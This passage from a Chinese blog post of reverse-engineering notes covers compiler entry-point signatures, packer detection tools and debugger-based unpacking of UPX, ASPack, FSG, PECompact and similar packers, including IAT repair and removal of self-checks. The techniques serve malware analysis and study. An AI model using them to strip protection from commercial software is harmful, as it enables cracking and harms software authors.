alt=\"image-20230822082155469\"></p>\n<p>特征码： <code>55 8B EC 83 C4 F0 B8 ?? ?? ?? ?? E8 ?? ?? ?? ??</code></p>\n<h2 id=\"net\"><a class=\"markdownIt-Anchor\" href=\"#net\">#</a> .NET</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082215761.png\" alt=\"image-20230822082215761\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082227320.png\" alt=\"image-20230822082227320\"></p>\n<p>E <span class=\"exturl\" data-url=\"aHR0cDovL3huLS1maXE1aG42aXN2aWV0aXU2OGUuTkVU\">中加载了很多.NET</span> 运行库</p>\n<h2 id=\"asm\"><a class=\"markdownIt-Anchor\" href=\"#asm\">#</a> ASM</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082250064.png\" alt=\"image-20230822082250064\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082315269.png\" alt=\"image-20230822082315269\"></p>\n<p><strong>特征：小，入口点直接就是逻辑代码</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082328241.png\" alt=\"image-20230822082328241\"></p>\n<h2 id=\"bc-60\"><a class=\"markdownIt-Anchor\" href=\"#bc-60\">#</a> BC++ 6.0</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082346333.png\" alt=\"image-20230822082346333\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082358971.png\" alt=\"image-20230822082358971\"></p>\n<p><strong>特征：第一行是一个短跳转，跳过了字符串 fb:C++HOOK，跳转的最后一行是 CPPdebugHook，第一个调用的函数是 GetModuleHandleA</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082412419.png\" alt=\"image-20230822082412419\"></p>\n<p>BC++ 编写的程序，调用 IAT 函数会使用到 FF25 ?? ?? ?? ??</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082423700.png\" alt=\"image-20230822082423700\"></p>\n<p>PEID 匹配特征码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">EB 10 66 62 3A 43 2B 2B 48 4F 4F 4B 90</span><br></pre></td></tr></table></figure>\n<h2 id=\"vb\"><a class=\"markdownIt-Anchor\" href=\"#vb\">#</a> VB</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082434530.png\" alt=\"image-20230822082434530\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082445276.png\" alt=\"image-20230822082445276\"></p>\n<p>特征：push - call - 一堆 00</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082457006.png\" alt=\"image-20230822082457006\"></p>\n<h2 id=\"各种软件优缺点\"><a class=\"markdownIt-Anchor\" href=\"#各种软件优缺点\">#</a> 各种软件优缺点</h2>\n<p>1、通过 [PEiD](<span class=\"exturl\" data-url=\"aHR0cDovL2Rvd24uNTJwb2ppZS5jbi9Ub29scy9QRXRvb2xzL1BFaUQ=\">http://down.52pojie.cn/Tools/PEtools/PEiD</span> 0.95.rar)、<span class=\"exturl\" data-url=\"aHR0cDovL2Rvd24uNTJwb2ppZS5jbi9Ub29scy9QRXRvb2xzL0V4ZWluZm9QRS56aXA=\">Exeinfo PE</span> 等<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy41MnBvamllLmNuL2ZvcnVtLnBocD9tb2Q9Zm9ydW1kaXNwbGF5JmFtcDtmaWQ9NCZhbXA7ZmlsdGVyPXR5cGVpZCZhbXA7dHlwZWlkPTEyNA==\">查壳工具</span>内置各种壳的十六进制特征码进行对比查壳，说下优缺点吧。</p>\n<p>PEiD、FFI、FastScanner、RDG Packer Detector 这类程序都是通过目录下的 userdb.txt（查壳程序不同可能数据库名有出入）数据库进行加壳程序特征对比的，由于 userdb.txt 文件都是好多年前的了，全球基本都在用 fly 在 09 年发布的<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy41MnBvamllLmNuL3RocmVhZC0zMTQ1OC0xLTEuaHRtbA==\"> UpKPEiDSign</span>，即使有新的也都基于他制作的版本之上进行更新的，而且更新都没有太好效果，由于原理都是通过加壳程序的特征进行对应，而这些加壳特征都是个人总结而来，对加壳程序的模糊搜索对比造成可靠性不高，特别是对于 VMProtect 这类加密壳程序，经常被识别成一些算七八糟都没见过的加壳内容，特别是显示 UPolyX，基本都是误报，对新手的误导很严重，但对于传统的一些压缩壳的识别效果还是很好的，当然了，有利有弊，正是由于它的开放性特征库，也方便给大家提供自己编写特征的方法，来识别一些新的壳，期待大家能做出自己的加壳特征来。</p>\n<p>\\2. Exeinfo PE 属于新一代查壳工具，作者目前还在更新，它和 PEiD 的区别可能就在于它的特征库是作者自己维护，不支持外部修改，新版好像也开始支持外部特征库了，这款查壳工具的加壳特征库比较准确而且范围很广，如 Themida、WinLicense、VMProtect、ZProtect、Shielden 都可以轻松识别出来，但对于具体加壳程序的版本都是模糊的，其实个人认为加壳版本真的不重要，这个后面再具体说道，<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy41MnBvamllLmNuL3RocmVhZC0xNjk3NzktMS0xLmh0bWw=\">Exeinfo PE</span> 可以说是目前可以说最好的查壳工具了，推荐大家使用。</p>\n<p><strong>入口特征</strong>可以通过<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy41MnBvamllLmNuL3RocmVhZC0xNDk4Ni0xLTEuaHRtbA==\"> OllyDBG</span> 载入获得，载入后可以按一下 “Ctrl+A”，让 OD 分析一下代码，就可以把入口点一些特征字符串分析出来，从下图的入口信息可以轻松看出，这是一款 Safengine 加壳的程序，对于 Shielden、Safengine、VProtect 这类加壳程序都可以使用这种方法判断出来。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueHhoYWNrLnRvcC9hcmNoaXZlcy9uaS14aWFuZy1qaS1jaHUtLWJ1LXRvbmcteXUteWFuLWNoZW5nLXh1LWRlLXJ1LWtvdS10ZS16aGVuZw==\">https://www.xxhack.top/archives/ni-xiang-ji-chu--bu-tong-yu-yan-cheng-xu-de-ru-kou-te-zheng</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpd2VuOTMwNzIzL2FydGljbGUvZGV0YWlscy80OTQ3MjM3Nw==\">https://blog.csdn.net/liwen930723/article/details/49472377</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuNTJwb2ppZS5jbi90aHJlYWQtMjM0NzM5LTEtMS5odG1s\">https://www.52pojie.cn/thread-234739-1-1.html</span></p>\n<p>windows 程序状态大体可以分为以下几种类型：未加壳、压缩壳、传统加密壳、代码虚拟化保护、.Net 程序加密</p>\n<p>加壳的目的：为了隐藏程序真正的 OEP（入口点），防止被破解。</p>\n<p>1、查壳：用于分析软件有没有加壳，加壳是所使用的哪种壳。常用工具（PEID、Ollydbg、）。详细操作过程可参看《<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzJTNBLy9tYXguYm9vazExOC5jb20vaHRtbC8yMDIwLzA4MTgvNzA0NTA2NTAzNjAwMjE2MS5zaHRt\">破解基础 - 你到底有没有</span>》。</p>\n<p>2、寻找 OEP：OEP 是程序加壳前真正的入口点，外壳初始化的现场环境（各寄存器值）和原程序的现场环境是相同的，加壳程序初始化时保存各寄存器的值，外壳执行完毕，会恢复各寄存器内容。</p>\n<p>3、抓取内存映像文件（Dump）：完成外壳程序解压还原后，在内存中找到运行的目标 PE 进程数据，从内存中抓取出来，然后在用文件的形式保存下来。保存下来的文件可能不能正常运行，有可能是壳对 IAT 进行了加密。</p>\n<p><strong>抓取内存映像文件</strong>详细介绍可参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzJTNBLy9iYnMua2FueHVlLmNvbS90aHJlYWQtMTc2MjQuaHRt\">浅谈脱壳中的 Dump 技术</span></p>\n<p>4、输入表重建（修改 IAT）：一些加密壳为了防止输入表被还原，会在 IAT 里填充一些扰乱解析的地址（例如：壳中用来 HOOK-API 的外壳代码地址），为了获得没有加密的 IAT，一般可跟踪加壳程序对 IAT 处理过程，修改相关指令，阻止外壳加密 IAT。</p>\n<p><strong>输入表重建</strong>详细介绍可参考文件：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLnpoaWh1LmNvbS8/dGFyZ2V0PWh0dHBzJTNBLy93ZW5rdS5iYWlkdS5jb20vdmlldy9jNzI2ODk1MWFiMTE0NDMxYjkwZDZjODVlYzNhODdjMjQwMjg4YTI3Lmh0bWwlM0Zfd2t0c18lM0QxNjczMzQwMTMzMDA4JTI2YmRRdWVyeSUzRCVFOCVCRSU5MyVFNSU4NSVBNSVFOCVBMSVBOCVFOSU4NyU4RCVFNSVCQiVCQQ==\">重建输入表 - 百度文库</span></p>\n<p>压缩 ==》 减小程序体积【ASPacK、UPX、PECompack 等】 保护程序 ==》 用了各种反跟踪技术保护程序不被调试、脱壳等【ASProtect、Armadillo、EXECryptor 等】</p>\n<h2 id=\"upx\"><a class=\"markdownIt-Anchor\" href=\"#upx\">#</a> upx</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082556084.png\" alt=\"image-20230822082556084\"></p>\n<h3 id=\"单步跟踪\"><a class=\"markdownIt-Anchor\" href=\"#单步跟踪\">#</a> 单步跟踪</h3>\n<p>1. 找到 OEP</p>\n<p>不能向上跳转，向下跳如果下一行还是跳转 (jmp,call) 就再隔一行。只需要看红线跳转</p>\n<p>直到看到大跨度跳转，就是跳往 OEP</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082607763.png\" alt=\"image-20230822082607763\"></p>\n<p>jmp     0047738C</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082642574.png\" alt=\"image-20230822082642574\"></p>\n<p>2. 脱壳</p>\n<p>可以使用 OD 或者 loadpe</p>\n<p>OD 有两种方式：方式 1 和方式二。使用 ollydump</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082702108.png\" alt=\"image-20230822082702108\"></p>\n<p>loadpe</p>\n<p>修正镜像大小 -&gt; 完整转存</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082719412.png\" alt=\"image-20230822082719412\"></p>\n<p>输入表重建，修复转存文件</p>\n<h3 id=\"esp\"><a class=\"markdownIt-Anchor\" href=\"#esp\">#</a> ESP</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082743504.png\" alt=\"image-20230822082743504\"></p>\n<p>dd esp 或者在数据窗口中跟随 esp</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082756289.png\" alt=\"image-20230822082756289\"></p>\n<p>在数据窗口中下硬件访问断点，word</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082810312.png\" alt=\"image-20230822082810312\"></p>\n<p>跳转到 oep</p>\n<p>删除硬件断点</p>\n<h3 id=\"二次内存镜像\"><a class=\"markdownIt-Anchor\" href=\"#二次内存镜像\">#</a> 二次内存镜像</h3>\n<p>先解压 rsrc 以前的所有内容，在对上面的内容下段</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082835523.png\" alt=\"image-20230822082835523\"></p>\n<p>先对 rsrc 下 F2，在对 upx0 下 F2</p>\n<h3 id=\"查找\"><a class=\"markdownIt-Anchor\" href=\"#查找\">#</a> 查找</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082851190.png\" alt=\"image-20230822082851190\"></p>\n<p>直接找 popad，适用于大部分 upx 和 asp</p>\n<h2 id=\"asp\"><a class=\"markdownIt-Anchor\" href=\"#asp\">#</a> ASP</h2>\n<h3 id=\"1单步跟踪\"><a class=\"markdownIt-Anchor\" href=\"#1单步跟踪\">#</a> 1. 单步跟踪</h3>\n<p>和脱 upx 一样。但是如果碰到 call 程序直接执行，需要 F7 跟进去，一直到 popad，ret 之后就是 oep 了</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082905760.png\" alt=\"image-20230822082905760\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082921137.png\" alt=\"image-20230822082921137\"></p>\n<p>使用 ollydump 脱壳</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082932908.png\" alt=\"image-20230822082932908\"></p>\n<h3 id=\"2esp\"><a class=\"markdownIt-Anchor\" href=\"#2esp\">#</a> 2.ESP</h3>\n<p>和 upx 一样，下硬件访问断点，断下之后，下面的 retn 就是跳转到 oep</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082954787.png\" alt=\"image-20230822082954787\"></p>\n<h3 id=\"查找popad\"><a class=\"markdownIt-Anchor\" href=\"#查找popad\">#</a> 查找 popad</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083008532.png\" alt=\"image-20230822083008532\"></p>\n<p>如果有多个 popad，ctrl+L 查找下一个</p>\n<h3 id=\"内存镜像\"><a class=\"markdownIt-Anchor\" href=\"#内存镜像\">#</a> 内存镜像</h3>\n<p>memory 中 rsrc 下一次断，401000 第二次下段</p>\n<p>然后单步法</p>\n<h3 id=\"模拟跟踪\"><a class=\"markdownIt-Anchor\" href=\"#模拟跟踪\">#</a> 模拟跟踪</h3>\n<p>tc eip &lt; .aspack 地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083024652.png\" alt=\"image-20230822083024652\"></p>\n<h3 id=\"sfx\"><a class=\"markdownIt-Anchor\" href=\"#sfx\">#</a> SFX</h3>\n<p>选项中</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083039582.png\" alt=\"image-20230822083039582\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083052191.png\" alt=\"image-20230822083052191\"></p>\n<h2 id=\"nsp\"><a class=\"markdownIt-Anchor\" href=\"#nsp\">#</a> NSP</h2>\n<h3 id=\"esp-2\"><a class=\"markdownIt-Anchor\" href=\"#esp-2\">#</a> ESP</h3>\n<p>1. 找到 oep</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083104779.png\" alt=\"image-20230822083104779\"></p>\n<p>2. 在 loadpe 中修正镜像大小，完整转存</p>\n<p>3. 修复</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083129331.png\" alt=\"image-20230822083129331\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083139488.png\" alt=\"image-20230822083139488\"></p>\n<h3 id=\"单步跟踪-2\"><a class=\"markdownIt-Anchor\" href=\"#单步跟踪-2\">#</a> 单步跟踪</h3>\n<p>和前两个方法一样</p>\n<h3 id=\"模拟跟踪-2\"><a class=\"markdownIt-Anchor\" href=\"#模拟跟踪-2\">#</a> 模拟跟踪</h3>\n<p>tc eip&lt;nsp1 地址</p>\n<h3 id=\"两次内存镜像\"><a class=\"markdownIt-Anchor\" href=\"#两次内存镜像\">#</a> 两次内存镜像</h3>\n<p>nsp0 下段，在单步</p>\n<h3 id=\"特殊方法\"><a class=\"markdownIt-Anchor\" href=\"#特殊方法\">#</a> 特殊方法</h3>\n<p>at GetVersion</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083157718.png\" alt=\"image-20230822083157718\"></p>\n<p>在 retn 出下段，执行到该行，在执行一次到 oep 之后</p>\n<p>适用于北斗 3 前版本</p>\n<h2 id=\"fsg\"><a class=\"markdownIt-Anchor\" href=\"#fsg\">#</a> FSG</h2>\n<h3 id=\"修复\"><a class=\"markdownIt-Anchor\" href=\"#修复\">#</a> 修复</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083212702.png\" alt=\"image-20230822083212702\"></p>\n<p>首先通过单步法找到连续的 jmp，最下面一个 jmp 就会 jmp 到 oep 的位置</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083228686.png\" alt=\"image-20230822083228686\"></p>\n<p>进行转存并修复</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083243079.png\" alt=\"image-20230822083243079\"></p>\n<p>手动查找 IAT。使用任意函数找到 IAT</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083303882.png\" alt=\"image-20230822083303882\"></p>\n<p>425000 开始是 iat</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083317145.png\" alt=\"image-20230822083317145\"></p>\n<p>425284 是结束</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083332766.png\" alt=\"image-20230822083332766\"></p>\n<p>25000-25284。更改 rva，大小不想算可以直接写 1000</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083347811.png\" alt=\"image-20230822083347811\"></p>\n<p>获取导入表，显示无效的，剪切指针，修正转存，即可修复 IAT</p>\n<h3 id=\"esp-3\"><a class=\"markdownIt-Anchor\" href=\"#esp-3\">#</a> esp</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083402143.png\" alt=\"image-20230822083402143\"></p>\n<p>运行到 push 之后使用 esp</p>\n<h3 id=\"特殊esp\"><a class=\"markdownIt-Anchor\" href=\"#特殊esp\">#</a> 特殊 esp</h3>\n<p>运行扫 push 上一行后，堆栈中第四行即为 OEP</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083418966.png\" alt=\"image-20230822083418966\"></p>\n<p>反汇编窗口中跟随，下硬件断点，shitf+f9, 即可调到 oep</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083432375.png\" alt=\"image-20230822083432375\"></p>\n<h2 id=\"pe-compact-2x\"><a class=\"markdownIt-Anchor\" href=\"#pe-compact-2x\">#</a> PE compact 2.x</h2>\n<h3 id=\"单步\"><a class=\"markdownIt-Anchor\" href=\"#单步\">#</a> 单步</h3>\n<p>有会执行的 call 就跟进去，直到这个 jmp 调到 oep</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083453982.png\" alt=\"image-20230822083453982\"></p>\n<h3 id=\"esp-4\"><a class=\"markdownIt-Anchor\" href=\"#esp-4\">#</a> esp</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083507205.png\" alt=\"image-20230822083507205\"></p>\n<h3 id=\"\"><a class=\"markdownIt-Anchor\" href=\"#\">#</a> ？</h3>\n<p>BP VirtualFree</p>\n<p>shitf + f9</p>\n<p>取消断点</p>\n<p>alt + F9 执行到用户代码</p>\n<p>查找 push 8000</p>\n<p>单步</p>\n<h3 id=\"-2\"><a class=\"markdownIt-Anchor\" href=\"#-2\">#</a> ？？</h3>\n<p>BP VirtualFree</p>\n<p>shift + f9</p>\n<p>shift + f9</p>\n<p>取消断点</p>\n<p>alt + f9</p>\n<h3 id=\"-3\"><a class=\"markdownIt-Anchor\" href=\"#-3\">#</a> ？？？</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083520274.png\" alt=\"image-20230822083520274\"></p>\n<p>BP 0045DE74</p>\n<p>shift + f9</p>\n<p>断点下到执行到 retn 下面一行，shift + f9</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083531604.png\" alt=\"image-20230822083531604\"></p>\n<p>单步</p>\n<h3 id=\"-4\"><a class=\"markdownIt-Anchor\" href=\"#-4\">#</a> ？？？？</h3>\n<p>BP VirtualFree</p>\n<p>shift + f9</p>\n<p>取消断点</p>\n<p>alt + F9</p>\n<p>找到下一个 jmp，单步</p>\n<h3 id=\"异常\"><a class=\"markdownIt-Anchor\" href=\"#异常\">#</a> 异常</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083547111.png\" alt=\"image-20230822083547111\"></p>\n<p>重新运行程序，多次 shift + f9 直到程序运行</p>\n<p>那么在程序运行前的一次 shift + f9，在堆栈窗口中找 se 句柄，在反汇编窗口中跟随</p>\n<p>找到 retn 下一行，运行到，单步</p>\n<h3 id=\"两次内存\"><a class=\"markdownIt-Anchor\" href=\"#两次内存\">#</a> 两次内存</h3>\n<p>rsrc 第一次下段</p>\n<p>text 第二次下段</p>\n<p>执行到 retn 下一行，单步</p>\n<h3 id=\"at-getversion\"><a class=\"markdownIt-Anchor\" href=\"#at-getversion\">#</a> at getversion</h3>\n<p>at GetVersion 之后</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083606646.png\" alt=\"image-20230822083606646\"></p>\n<p>运行到 retn，F8，即可到达程序。向上翻就是 oep</p>\n<h2 id=\"ezip\"><a class=\"markdownIt-Anchor\" href=\"#ezip\">#</a> ezip</h2>\n<h3 id=\"单步-2\"><a class=\"markdownIt-Anchor\" href=\"#单步-2\">#</a> 单步</h3>\n<p>不要管开局那堆 jmp</p>\n<p>如果修复完不能运行，使用重建 pe</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083621475.png\" alt=\"image-20230822083621475\"></p>\n<h3 id=\"esp-5\"><a class=\"markdownIt-Anchor\" href=\"#esp-5\">#</a> esp</h3>\n<p>运行到这一行使用 esp 法</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083635266.png\" alt=\"image-20230822083635266\"></p>\n<h2 id=\"telock-098b1\"><a class=\"markdownIt-Anchor\" href=\"#telock-098b1\">#</a> telock 0.98b1</h2>\n<h3 id=\"最后一次异常\"><a class=\"markdownIt-Anchor\" href=\"#最后一次异常\">#</a> 最后一次异常</h3>\n<p>第 n-1 次异常，转到 se</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083648254.png\" alt=\"image-20230822083648254\"></p>\n<p>下段，shift + f9，单步</p>\n<p>找到大跳转</p>\n<p>记下 oep</p>\n<p>使用带壳程序进 irce 原版，查找无效的，L3 修复，修不了的就剪切，修复转存完整镜像的</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083659624.png\" alt=\"image-20230822083659624\"></p>\n<h3 id=\"模拟跟踪-3\"><a class=\"markdownIt-Anchor\" href=\"#模拟跟踪-3\">#</a> 模拟跟踪</h3>\n<p>第 n-1 次异常，转到 se</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083719816.png\" alt=\"image-20230822083719816\"></p>\n<p>下段，shift + f9</p>\n<p>tc eip &lt; 42c000</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083735883.png\" alt=\"image-20230822083735883\"></p>\n<h3 id=\"两次内存-2\"><a class=\"markdownIt-Anchor\" href=\"#两次内存-2\">#</a> 两次内存</h3>\n<p>rsrc</p>\n<p>text</p>\n<h2 id=\"exe32\"><a class=\"markdownIt-Anchor\" href=\"#exe32\">#</a> exe32</h2>\n<h3 id=\"esp-6\"><a class=\"markdownIt-Anchor\" href=\"#esp-6\">#</a> esp</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083751223.png\" alt=\"image-20230822083751223\"></p>\n<h3 id=\"isdeubggerpresent\"><a class=\"markdownIt-Anchor\" href=\"#isdeubggerpresent\">#</a> IsDeubggerPresent</h3>\n<p>BP IsDebuggerPresent</p>\n<p>shift + F9</p>\n<p>取消断点</p>\n<p>alt+f9</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083802156.png\" alt=\"image-20230822083802156\"></p>\n<p>两个 edi 相加的值就是 oep</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083813219.png\" alt=\"image-20230822083813219\"></p>\n<h2 id=\"win\"><a class=\"markdownIt-Anchor\" href=\"#win\">#</a> win</h2>\n<h3 id=\"条件断点\"><a class=\"markdownIt-Anchor\" href=\"#条件断点\">#</a> 条件断点</h3>\n<p>单步到 je 0040A41E 下条件断点 eax == 0</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083836244.png\" alt=\"image-20230822083836244\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083847088.png\" alt=\"image-20230822083847088\"></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueWlpNjY2LmNvbS9ibG9nLzM1MjY5NS5odG1s\">https://www.yii666.com/blog/352695.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vejVvbmswL3AvMTcyODcyMTUuaHRtbA==\">https://www.cnblogs.com/z5onk0/p/17287215.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81OTc4OTM1NjA/dXRtX2lkPTA=\">https://zhuanlan.zhihu.com/p/597893560?utm_id=0</span></p>\n<h2 id=\"附加数据处理方法\"><a class=\"markdownIt-Anchor\" href=\"#附加数据处理方法\">#</a> 附加数据处理方法</h2>\n<p>显示 overlay 标识带有附加数据</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822083909084.png\" alt=\"image-20230822083909084\"></p>\n<p>先脱壳，脱壳玩之后已经不能打开，接着找附加数据，打开源程序 8c00 之后的附加数据，一直复制到最后</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202125880.png\" alt=\"image-20230823202125880\"></p>\n<p>在脱壳后的程序最后粘贴即可</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202143088.png\" alt=\"image-20230823202143088\"></p>\n<p>建议使用 hex workshop</p>\n<p>计算开始位置</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202203988.png\" alt=\"image-20230823202203988\"></p>\n<p>最后一个区段的大小的偏移 8800+400</p>\n<p>或者使用 overlay 最终版</p>\n<h2 id=\"去除自校验\"><a class=\"markdownIt-Anchor\" href=\"#去除自校验\">#</a> 去除自校验</h2>\n<p>程序脱壳后，和源程序对比，找到和源程序不一样的地方</p>\n<p>两个程序都用 od 打开，下 bp CreateFileA</p>\n<p>运行；</p>\n<p>alt  + f9</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202221116.png\" alt=\"image-20230823202221116\"></p>\n<p>逐行对比找到不一样的地方</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202234145.png\" alt=\"image-20230823202234145\"></p>\n<p>脱壳后的跳转实现了，把脱壳后改成和原来改成一样的，保存</p>\n<p>即可正常执行</p>\n<h2 id=\"脱壳简单应用-汉化-diy\"><a class=\"markdownIt-Anchor\" href=\"#脱壳简单应用-汉化-diy\">#</a> 脱壳简单应用 - 汉化 - diy</h2>\n<p>vb 类软件用 getvbresource</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202249108.png\" alt=\"image-20230823202249108\"></p>\n<p>c 类汉化用 reource hacker peexploer  xnresoure</p>\n<p>如果不能显示说明脱壳没脱干净，需要 fix</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202304474.png\" alt=\"image-20230823202304474\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230823202316491.png\" alt=\"image-20230823202316491\"></p>\n<p>C++ 类</p>\n<p>XNRreoute</p>\n<h2 id=\"asp变形壳\"><a class=\"markdownIt-Anchor\" href=\"#asp变形壳\">#</a> ASP 变形壳</h2>\n<h3 id=\"单步-3\"><a class=\"markdownIt-Anchor\" href=\"#单步-3\">#</a> 单步</h3>\n<p>近 call F7 远 call F8</p>\n<h3 